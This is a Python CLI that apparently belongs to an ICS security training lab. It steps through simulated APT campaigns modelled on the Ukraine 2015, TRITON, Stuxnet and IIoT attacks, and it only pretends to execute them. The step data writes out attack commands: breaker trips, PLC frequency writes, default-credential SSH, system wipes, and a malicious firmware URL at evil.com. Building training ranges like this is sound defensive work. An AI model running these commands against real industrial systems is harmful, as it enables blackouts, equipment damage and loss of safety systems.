#!/usr/bin/env python3
"""
VULNOT APT Campaign Manager
Multi-stage attack chains simulating real-world APT techniques

Attack Phases:
1. Initial Access - Exploit vulnerable services
2. Execution - Run malicious payloads
3. Persistence - Maintain access
4. Discovery - Map the OT network
5. Lateral Movement - Pivot to other systems
6. Collection - Gather intelligence
7. Impact - Execute final payload

Based on MITRE ATT&CK for ICS
"""

import argparse
import json
import os
import sys
import time
import socket
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional
from datetime import datetime
from enum import Enum
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.tree import Tree
from rich.prompt import Confirm, Prompt

console = Console()


class AttackPhase(Enum):
    RECON = "Reconnaissance"
    INITIAL_ACCESS = "Initial Access"
    EXECUTION = "Execution"
    PERSISTENCE = "Persistence"
    PRIVILEGE_ESCALATION = "Privilege Escalation"
    DEFENSE_EVASION = "Defense Evasion"
    DISCOVERY = "Discovery"
    LATERAL_MOVEMENT = "Lateral Movement"
    COLLECTION = "Collection"
    COMMAND_CONTROL = "Command & Control"
    IMPACT = "Impact"


@dataclass
class AttackStep:
    """Single attack step"""
    id: str
    name: str
    phase: AttackPhase
    technique_id: str  # MITRE ATT&CK
    description: str
    target: str
    command: str
    success_indicator: str
    completed: bool = False
    timestamp: Optional[float] = None
    output: str = ""


@dataclass
class APTCampaign:
    """APT Campaign definition"""
    name: str
    description: str
    objective: str
    steps: List[AttackStep] = field(default_factory=list)
    started: Optional[float] = None
    completed: Optional[float] = None
    current_step: int = 0


# =============================================================================
# PREDEFINED CAMPAIGNS
# =============================================================================

CAMPAIGNS = {
    "ukraine_2015": APTCampaign(
        name="Ukraine Power Grid (2015)",
        description="Simulation of the 2015 Ukraine power grid attack",
        objective="Cause widespread blackout via substation breaker manipulation",
        steps=[
            AttackStep(
                id="UA15-01",
                name="Spearphishing Reconnaissance",
                phase=AttackPhase.RECON,
                technique_id="T0865",
                description="Gather information about power company employees",
                target="IT Network",
                command="# Social engineering - manual step",
                success_indicator="Employee list obtained"
            ),
            AttackStep(
                id="UA15-02", 
                name="Initial Compromise",
                phase=AttackPhase.INITIAL_ACCESS,
                technique_id="T0866",
                description="Deploy BlackEnergy malware via spearphishing",
                target="IT Workstation",
                command="vulnot-apt deploy --target IT --payload blackenergy",
                success_indicator="Malware beacon established"
            ),
            AttackStep(
                id="UA15-03",
                name="Credential Harvesting",
                phase=AttackPhase.DISCOVERY,
                technique_id="T0859",
                description="Harvest VPN and OT network credentials",
                target="IT Network",
                command="vulnot-apt harvest --type credentials",
                success_indicator="OT credentials captured"
            ),
            AttackStep(
                id="UA15-04",
                name="VPN Access",
                phase=AttackPhase.LATERAL_MOVEMENT,
                technique_id="T0867",
                description="Access OT network via stolen VPN credentials",
                target="OT Network",
                command="vulnot-apt pivot --via vpn --target 10.0.2.0/24",
                success_indicator="OT network access confirmed"
            ),
            AttackStep(
                id="UA15-05",
                name="SCADA Discovery",
                phase=AttackPhase.DISCOVERY,
                technique_id="T0846",
                description="Map SCADA network and identify HMIs",
                target="10.0.2.0/24",
                command="vulnot-dnp3 scan -n 10.0.2.0/24",
                success_indicator="RTUs and HMIs identified"
            ),
            AttackStep(
                id="UA15-06",
                name="HMI Access",
                phase=AttackPhase.LATERAL_MOVEMENT,
                technique_id="T0823",
                description="Remote desktop to SCADA HMI",
                target="HMI Server",
                command="vulnot-apt rdp --target 10.0.2.5",
                success_indicator="HMI session established"
            ),
            AttackStep(
                id="UA15-07",
                name="Breaker Control",
                phase=AttackPhase.IMPACT,
                technique_id="T0831",
                description="Open circuit breakers via HMI",
                target="Substations",
                command="vulnot-dnp3 control -t 10.0.2.10 --point 0 --action trip",
                success_indicator="Breakers opened - BLACKOUT"
            ),
            AttackStep(
                id="UA15-08",
                name="UPS Destruction",
                phase=AttackPhase.IMPACT,
                technique_id="T0879",
                description="Disable UPS to prevent recovery",
                target="Control Center",
                command="vulnot-apt destroy --target ups",
                success_indicator="UPS systems disabled"
            ),
            AttackStep(
                id="UA15-09",
                name="KillDisk Deployment",
                phase=AttackPhase.IMPACT,
                technique_id="T0892",
                description="Deploy KillDisk to destroy workstations",
                target="IT/OT Systems",
                command="vulnot-apt wipe --target all",
                success_indicator="Systems wiped"
            ),
        ]
    ),
    
    "triton_2017": APTCampaign(
        name="TRITON/TRISIS (2017)",
        description="Attack on safety instrumented systems",
        objective="Disable safety systems to enable physical damage",
        steps=[
            AttackStep(
                id="TR17-01",
                name="IT Network Compromise",
                phase=AttackPhase.INITIAL_ACCESS,
                technique_id="T0866",
                description="Compromise IT network via unknown vector",
                target="IT Network",
                command="vulnot-apt deploy --target IT",
                success_indicator="IT foothold established"
            ),
            AttackStep(
                id="TR17-02",
                name="Engineering Workstation",
                phase=AttackPhase.LATERAL_MOVEMENT,
                technique_id="T0867",
                description="Pivot to engineering workstation",
                target="Engineering WS",
                command="vulnot-apt pivot --target eng-ws",
                success_indicator="Engineering WS compromised"
            ),
            AttackStep(
                id="TR17-03",
                name="SIS Discovery",
                phase=AttackPhase.DISCOVERY,
                technique_id="T0846",
                description="Identify Safety Instrumented Systems",
                target="SIS Network",
                command="vulnot-apt scan --target sis-network",
                success_indicator="Triconex controllers found"
            ),
            AttackStep(
                id="TR17-04",
                name="TRITON Framework Deploy",
                phase=AttackPhase.EXECUTION,
                technique_id="T0863",
                description="Deploy TRITON attack framework",
                target="SIS Controllers",
                command="vulnot-apt deploy --payload triton --target sis",
                success_indicator="TRITON framework active"
            ),
            AttackStep(
                id="TR17-05",
                name="Safety Logic Modification",
                phase=AttackPhase.IMPACT,
                technique_id="T0836",
                description="Modify safety controller logic",
                target="Triconex SIS",
                command="vulnot-apt modify --target sis --logic disable",
                success_indicator="Safety systems compromised"
            ),
        ]
    ),
    
    "stuxnet_style": APTCampaign(
        name="Stuxnet-Style Attack",
        description="Air-gapped network compromise via USB",
        objective="Damage industrial equipment via PLC manipulation",
        steps=[
            AttackStep(
                id="SX-01",
                name="Zero-Day Exploitation",
                phase=AttackPhase.INITIAL_ACCESS,
                technique_id="T0866",
                description="Compromise via USB autorun vulnerability",
                target="Engineering Laptop",
                command="# USB drop attack - physical access required",
                success_indicator="Initial foothold via USB"
            ),
            AttackStep(
                id="SX-02",
                name="Network Propagation",
                phase=AttackPhase.LATERAL_MOVEMENT,
                technique_id="T0867",
                description="Spread via network shares and removable media",
                target="OT Network",
                command="vulnot-apt propagate --method smb,usb",
                success_indicator="Multiple systems infected"
            ),
            AttackStep(
                id="SX-03",
                name="PLC Fingerprinting",
                phase=AttackPhase.DISCOVERY,
                technique_id="T0846",
                description="Identify Siemens S7-300/400 PLCs",
                target="Process Network",
                command="vulnot-s7 scan -n 10.0.3.0/24",
                success_indicator="Target PLCs identified"
            ),
            AttackStep(
                id="SX-04",
                name="Project File Theft",
                phase=AttackPhase.COLLECTION,
                technique_id="T0845",
                description="Steal PLC project files for analysis",
                target="Engineering WS",
                command="vulnot-apt collect --target step7-projects",
                success_indicator="Project files exfiltrated"
            ),
            AttackStep(
                id="SX-05",
                name="Rootkit Installation",
                phase=AttackPhase.PERSISTENCE,
                technique_id="T0839",
                description="Install PLC rootkit to hide modifications",
                target="S7 PLCs",
                command="vulnot-apt rootkit --target plc --type s7",
                success_indicator="PLC rootkit active"
            ),
            AttackStep(
                id="SX-06",
                name="Frequency Manipulation",
                phase=AttackPhase.IMPACT,
                technique_id="T0831",
                description="Modify VFD frequencies to damage equipment",
                target="Variable Frequency Drives",
                command="vulnot-s7 write -t 10.0.3.10 --db 1 --offset 0 --value 1400",
                success_indicator="VFD frequencies modified"
            ),
        ]
    ),
    
    "iiot_compromise": APTCampaign(
        name="IIoT Supply Chain Attack",
        description="Compromise via vulnerable IIoT devices",
        objective="Pivot from IIoT sensors to core OT systems",
        steps=[
            AttackStep(
                id="IIOT-01",
                name="Shodan Reconnaissance",
                phase=AttackPhase.RECON,
                technique_id="T0865",
                description="Find exposed MQTT brokers",
                target="Internet",
                command="vulnot-mqtt scan --target mqtt.vulnot.local",
                success_indicator="MQTT broker found"
            ),
            AttackStep(
                id="IIOT-02",
                name="MQTT Broker Access",
                phase=AttackPhase.INITIAL_ACCESS,
                technique_id="T0866",
                description="Connect to unauthenticated MQTT broker",
                target="MQTT Broker",
                command="vulnot-mqtt connect --broker 10.0.7.5",
                success_indicator="MQTT connection established"
            ),
            AttackStep(
                id="IIOT-03",
                name="Topic Enumeration",
                phase=AttackPhase.DISCOVERY,
                technique_id="T0846",
                description="Subscribe to wildcard topics",
                target="MQTT Broker",
                command="vulnot-mqtt subscribe --topic '#'",
                success_indicator="All topics enumerated"
            ),
            AttackStep(
                id="IIOT-04",
                name="Gateway Discovery",
                phase=AttackPhase.DISCOVERY,
                technique_id="T0846",
                description="Identify edge gateways from topics",
                target="IIoT Network",
                command="vulnot-mqtt enum --type gateways",
                success_indicator="Edge gateways identified"
            ),
            AttackStep(
                id="IIOT-05",
                name="Default Credentials",
                phase=AttackPhase.LATERAL_MOVEMENT,
                technique_id="T0859",
                description="Access gateway with default credentials",
                target="Edge Gateway",
                command="vulnot-apt ssh --target 10.0.7.10 --user admin --pass admin123",
                success_indicator="Gateway shell access"
            ),
            AttackStep(
                id="IIOT-06",
                name="Firmware Backdoor",
                phase=AttackPhase.PERSISTENCE,
                technique_id="T0839",
                description="Deploy malicious firmware update",
                target="Edge Gateway",
                command="vulnot-mqtt publish --topic 'factory/firmware/GW-LINE1/update' --payload '{\"url\":\"http://evil.com/fw.bin\"}'",
                success_indicator="Backdoored firmware installed"
            ),
            AttackStep(
                id="IIOT-07",
                name="Sensor Manipulation",
                phase=AttackPhase.IMPACT,
                technique_id="T0831",
                description="Manipulate sensor readings",
                target="IIoT Sensors",
                command="vulnot-mqtt publish --topic 'factory/control/TEMP-L1-01/cmd' --payload '{\"offset\": -20}'",
                success_indicator="Sensor readings falsified"
            ),
        ]
    ),
}


# =============================================================================
# CAMPAIGN EXECUTOR
# =============================================================================

class CampaignExecutor:
    """Execute APT campaigns"""
    
    def __init__(self):
        self.current_campaign: Optional[APTCampaign] = None
        self.log_file = "apt_campaign.log"
        
    def list_campaigns(self):
        """List available campaigns"""
        table = Table(title="Available APT Campaigns")
        table.add_column("ID", style="cyan")
        table.add_column("Name", style="white")
        table.add_column("Steps", style="green")
        table.add_column("Objective", style="yellow")
        
        for cid, campaign in CAMPAIGNS.items():
            table.add_row(
                cid,
                campaign.name,
                str(len(campaign.steps)),
                campaign.objective[:50] + "..."
            )
            
        console.print(table)
        
    def show_campaign(self, campaign_id: str):
        """Show campaign details"""
        if campaign_id not in CAMPAIGNS:
            console.print(f"[red]Campaign not found: {campaign_id}[/]")
            return
            
        campaign = CAMPAIGNS[campaign_id]
        
        console.print(Panel(
            f"[bold]{campaign.name}[/]\n\n"
            f"{campaign.description}\n\n"
            f"[yellow]Objective:[/] {campaign.objective}",
            title="Campaign Details",
            border_style="cyan"
        ))
        
        # Show attack chain as tree
        tree = Tree(f"[bold cyan]{campaign.name}[/]")
        
        current_phase = None
        phase_branch = None
        
        for step in campaign.steps:
            if step.phase != current_phase:
                current_phase = step.phase
                phase_branch = tree.add(f"[yellow]{current_phase.value}[/]")
                
            status = "[green]✓[/]" if step.completed else "[dim]○[/]"
            step_text = f"{status} {step.id}: {step.name} [dim]({step.technique_id})[/]"
            phase_branch.add(step_text)
            
        console.print(tree)
        
    def start_campaign(self, campaign_id: str):
        """Start a campaign"""
        if campaign_id not in CAMPAIGNS:
            console.print(f"[red]Campaign not found: {campaign_id}[/]")
            return
            
        self.current_campaign = CAMPAIGNS[campaign_id]
        self.current_campaign.started = time.time()
        self.current_campaign.current_step = 0
        
        console.print(Panel(
            f"[bold red]STARTING APT CAMPAIGN[/]\n\n"
            f"Name: {self.current_campaign.name}\n"
            f"Steps: {len(self.current_campaign.steps)}\n"
            f"Objective: {self.current_campaign.objective}",
            title="⚠️ CAMPAIGN INITIATED",
            border_style="red"
        ))
        
        self.log(f"Campaign started: {campaign_id}")
        
    def execute_step(self, step_num: Optional[int] = None):
        """Execute a campaign step"""
        if not self.current_campaign:
            console.print("[red]No campaign active. Use 'start' first.[/]")
            return
            
        if step_num is None:
            step_num = self.current_campaign.current_step
            
        if step_num >= len(self.current_campaign.steps):
            console.print("[green]Campaign complete![/]")
            return
            
        step = self.current_campaign.steps[step_num]
        
        console.print(Panel(
            f"[bold]{step.phase.value}[/]\n\n"
            f"[cyan]Step {step_num + 1}/{len(self.current_campaign.steps)}:[/] {step.name}\n"
            f"[dim]MITRE ATT&CK: {step.technique_id}[/]\n\n"
            f"{step.description}\n\n"
            f"[yellow]Target:[/] {step.target}\n"
            f"[yellow]Command:[/] {step.command}",
            title=f"Step: {step.id}",
            border_style="yellow"
        ))
        
        if Confirm.ask("Execute this step?"):
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console,
            ) as progress:
                task = progress.add_task(f"Executing {step.name}...", total=None)
                time.sleep(2)  # Simulate execution
                
            step.completed = True
            step.timestamp = time.time()
            step.output = f"Simulated execution of {step.command}"
            
            console.print(f"[green]✓ Step completed: {step.success_indicator}[/]")
            self.log(f"Step executed: {step.id} - {step.name}")
            
            self.current_campaign.current_step = step_num + 1
        else:
            console.print("[yellow]Step skipped[/]")
            
    def run_all(self):
        """Run all remaining steps"""
        if not self.current_campaign:
            console.print("[red]No campaign active.[/]")
            return
            
        console.print(Panel(
            f"[bold red]AUTOMATED CAMPAIGN EXECUTION[/]\n\n"
            f"This will execute all remaining steps automatically.\n"
            f"Steps remaining: {len(self.current_campaign.steps) - self.current_campaign.current_step}",
            border_style="red"
        ))
        
        if not Confirm.ask("[bold red]Proceed with automated attack?[/]"):
            return
            
        while self.current_campaign.current_step < len(self.current_campaign.steps):
            step = self.current_campaign.steps[self.current_campaign.current_step]
            
            console.print(f"\n[cyan]Executing: {step.id} - {step.name}[/]")
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console,
            ) as progress:
                task = progress.add_task(step.description, total=None)
                time.sleep(1.5)
                
            step.completed = True
            step.timestamp = time.time()
            console.print(f"[green]✓ {step.success_indicator}[/]")
            
            self.current_campaign.current_step += 1
            
        self.current_campaign.completed = time.time()
        
        console.print(Panel(
            f"[bold green]CAMPAIGN COMPLETE[/]\n\n"
            f"Objective achieved: {self.current_campaign.objective}\n"
            f"Duration: {self.current_campaign.completed - self.current_campaign.started:.0f}s",
            title="Campaign Summary",
            border_style="green"
        ))
        
    def status(self):
        """Show campaign status"""
        if not self.current_campaign:
            console.print("[yellow]No active campaign[/]")
            return
            
        completed = sum(1 for s in self.current_campaign.steps if s.completed)
        total = len(self.current_campaign.steps)
        
        console.print(Panel(
            f"Campaign: {self.current_campaign.name}\n"
            f"Progress: {completed}/{total} steps\n"
            f"Current Phase: {self.current_campaign.steps[self.current_campaign.current_step].phase.value if self.current_campaign.current_step < total else 'Complete'}",
            title="Campaign Status"
        ))
        
    def log(self, message: str):
        """Log campaign activity"""
        with open(self.log_file, "a") as f:
            f.write(f"{datetime.now().isoformat()} - {message}\n")


# =============================================================================
# CLI
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='VULNOT APT Campaign Manager',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  vulnot-apt list                    # List available campaigns
  vulnot-apt show ukraine_2015       # Show campaign details
  vulnot-apt start ukraine_2015      # Start a campaign
  vulnot-apt step                    # Execute next step
  vulnot-apt run                     # Run all steps
  vulnot-apt status                  # Show progress
        """
    )
    
    subparsers = parser.add_subparsers(dest='command')
    
    # List
    subparsers.add_parser('list', help='List campaigns')
    
    # Show
    show_p = subparsers.add_parser('show', help='Show campaign details')
    show_p.add_argument('campaign', help='Campaign ID')
    
    # Start
    start_p = subparsers.add_parser('start', help='Start campaign')
    start_p.add_argument('campaign', help='Campaign ID')
    
    # Step
    step_p = subparsers.add_parser('step', help='Execute step')
    step_p.add_argument('-n', '--number', type=int, help='Step number')
    
    # Run
    subparsers.add_parser('run', help='Run all steps')
    
    # Status
    subparsers.add_parser('status', help='Show status')
    
    args = parser.parse_args()
    
    executor = CampaignExecutor()
    
    if args.command == 'list':
        executor.list_campaigns()
    elif args.command == 'show':
        executor.show_campaign(args.campaign)
    elif args.command == 'start':
        executor.start_campaign(args.campaign)
    elif args.command == 'step':
        executor.execute_step(args.number)
    elif args.command == 'run':
        executor.run_all()
    elif args.command == 'status':
        executor.status()
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
